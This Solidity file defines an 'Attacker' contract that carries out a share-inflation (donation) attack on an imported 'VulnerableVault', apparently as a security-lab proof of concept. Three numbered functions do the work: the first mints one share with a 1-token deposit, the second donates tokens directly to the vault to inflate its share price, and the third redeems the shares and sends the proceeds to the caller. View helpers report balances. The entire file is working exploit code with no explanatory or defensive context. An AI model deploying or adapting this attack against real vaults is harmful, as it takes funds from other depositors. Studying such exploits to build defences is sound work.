// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {VulnerableVault} from "./VulnerableVault.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Attacker {
    VulnerableVault public vault;
    IERC20 public asset;

    constructor(VulnerableVault _vault) {
        vault = _vault;
        asset = IERC20(vault.asset());
    }

    function attackStep1_MintInitialShare() external {
        asset.transferFrom(msg.sender, address(this), 1);
        asset.approve(address(vault), 1);
        vault.deposit(1, address(this));
    }

    function attackStep2_InflateDenominator(uint256 amount) external {
        asset.transferFrom(msg.sender, address(this), amount);
        asset.transfer(address(vault), amount);
    }

    function attackStep3_BurnAndSteal() external {
        uint256 shares = vault.balanceOf(address(this));
        vault.redeem(shares, address(this), address(this));
        uint256 balance = asset.balanceOf(address(this));
        asset.transfer(msg.sender, balance);
    }

    function getVaultBalance() external view returns (uint256) {
        return asset.balanceOf(address(vault));
    }

    function getVaultShares() external view returns (uint256) {
        return vault.totalSupply();
    }

    function getMyShares() external view returns (uint256) {
        return vault.balanceOf(address(this));
    }

    function getMyBalance() external view returns (uint256) {
        return asset.balanceOf(address(this));
    }
}
